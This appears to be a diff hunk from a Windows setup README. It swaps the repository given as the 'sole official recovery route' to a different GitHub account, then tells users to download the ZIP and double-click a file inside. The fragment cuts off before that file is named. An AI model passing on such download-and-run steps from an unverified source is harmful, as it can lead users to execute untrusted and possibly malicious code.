@@ -18,7 +18,7 @@ Use 64-bit Windows with network access and preferably at least 30 GB free. The r
 
 Use this sole official recovery route:
 
-1. Open <https://github.com/baishihappy-ux/baishihappy-2>.
+1. Open <https://github.com/damaus001-jpg/kekouhappy>.
 2. Choose `Code`, then `Download ZIP`.
 3. Extract the downloaded ZIP into a new empty folder; never merge it over an older project download.
 4. Double-click this file at the extracted root:
